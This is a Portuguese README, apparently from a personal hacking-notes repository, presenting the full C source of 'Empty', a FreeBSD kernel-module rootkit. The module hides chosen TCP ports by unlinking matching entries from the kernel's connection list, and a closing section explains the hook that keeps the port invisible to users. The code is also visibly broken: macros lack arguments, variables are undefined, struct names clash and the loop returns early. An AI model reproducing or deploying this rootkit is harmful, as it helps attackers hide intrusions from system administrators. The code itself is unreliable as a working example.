<img width="30%" src="https://i.imgur.com/ULwPfn3.png"></img>

# Empty
[Empty](https://github.com/xnwm0/empty), foi um projeto que eu fiz quando estava estudando bsd-rootkit<br><br>

Basicamente, o que ele faz é parecido com o que o [lowlife](https://github.com/xnwm0/lowlife) faz, porém fiz um sistema de input em bash para o usuário especificar a porta que quer esconder.<br>
O que esse driver faz, é carregar a port list, e remover a porta dessa lista, assim mesmo que exista uma conexão estabelecida nessa determinada porta ela não é exibida<br><br>

empty.c
```c
/*
 *  by kosu @ greetz lowlife         $
 *  based on design bsd rootkits     $
 *                                  */


/* --- kld libs --- */
#include<sys/errno.h>
#include<sys/kernel.h>
#include<sys/module.h>
#include<sys/systm.h>
#include<sys/param.h>
#include<sys/types.h>
#include<sys/proc.h>
#include<sys/cdefs.h>
#include<sys/sysent.h>
#include<sys/queue.h>
#include<sys/socket.h>

/* --- network libs --- */
#include<net/if.h>
#include<netinet/in.h>
#include<netinet/in_pcb.h>
#include<netinet/ip_var.h>
#include<netinet/tcp_var.h>

/* --- config --- */

#include "conf/config.h"

struct empty_hide_arg { u_int16_t lport = w00t; };

static int empty_hide(struct thread *td, void *sysc_arg)
{
  struct empty_hide_args *empt;
  empt = (struct empty_hide_args *)sysc_arg;

  struct inpcb *inp_;

  INP_INFO_WLOCK(&tcbinfo);

  /* --- list --- */

  LIST_FOREACH()
  {
    if ( inp_->inp_vflag & INP_TIMEWAIT ) continue;
    INP_LOCK(inp_);

    /* --- remove port from list ;p (hide) --- */
    if (uap->lport == htons(inp_->inp_inc.inc_ie.ie_lport)) LIST_REMOVE(inp_, inp_list); INP_UNLOCK(inp_);
    return(0);
  }
}

static struct sysent empty_hide_sysent = { 1, empty_hide }; /* sysent for empty_hide */
static int offset = NO_SYSCALL;

/* --- empty loader --- */

static int empty(struct module *m, int cmd, void *arg)
{
  int err = 0;

  switch(cmd)
  {
    case MOD_LOAD:
      uprintf(" * Ok! empty KLD loaded on offset: %d *\n", offset);
      break;

    case MOD_UNLOAD:
      uprintf(" * Ok! empty KLD unloaded from offset: %d.\n", offset);
      break;

    default:
      err = EOPNOTSUPP;
      break;
  }

  return(err);

}

SYSCALL_MODULE(empty, &offset, &empty_hide_sysent, empty, NULL); /* --- load sysent  --- */
```

## Hook
Aqui que acontece o hook `if (uap->lport == htons(inp_->inp_inc.inc_ie.ie_lport)) LIST_REMOVE(inp_, inp_list); INP_UNLOCK(inp_);`<br>
Nessa linha, se a porta for encontrada na list, a função `LIST_REMOVE` remove ela, assim toda vez que for estabelecida uma conexão, esse driver deleta a porta da list, e nenhum usuário pode encontrar essa porta por meio de qualquer comando<br><br>

[pwn](../README.md)<br>
[home](../../README.md)
